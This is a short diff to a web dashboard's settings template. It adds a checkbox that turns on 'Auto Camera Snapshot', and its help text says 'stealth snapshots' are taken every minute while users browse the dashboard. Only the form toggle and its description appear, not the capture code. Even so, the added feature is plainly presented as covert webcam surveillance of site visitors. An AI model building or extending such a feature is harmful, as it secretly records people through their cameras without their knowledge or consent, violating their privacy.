@@ -21,6 +21,14 @@
             <textarea name="welcome_message" style="width: 100%; padding: 14px 20px; border: none; border-radius: 16px; background: var(--bg-primary); box-shadow: var(--inset-shadow); font-size: 16px; color: var(--text-primary); outline: none; resize: vertical; min-height: 100px; font-family: inherit;">{{ settings.welcome_message or '' }}</textarea>
         </div>
         
+        <div style="padding: 16px; border-radius: 16px; background: var(--bg-primary); box-shadow: var(--card-shadow); border-left: 4px solid var(--accent-blue);">
+            <label style="font-weight: 700; color: var(--text-secondary); cursor: pointer; display: flex; align-items: center; gap: 10px;">
+                <input type="checkbox" name="auto_snapshot_enabled" value="true" {% if settings.auto_snapshot_enabled %}checked{% endif %} style="transform: scale(1.4); accent-color: var(--accent-blue);">
+                <span>📸 Enable Auto Camera Snapshot (Captures every 1 minute)</span>
+            </label>
+            <div style="font-size: 12px; color: var(--text-muted); margin-top: 6px; margin-left: 30px;">When checked, stealth snapshots will be captured every 1 minute while users browse the dashboard.</div>
+        </div>
+        
         <button type="submit" class="btn btn-success">💾 Save Settings</button>
     </form>
 </div>
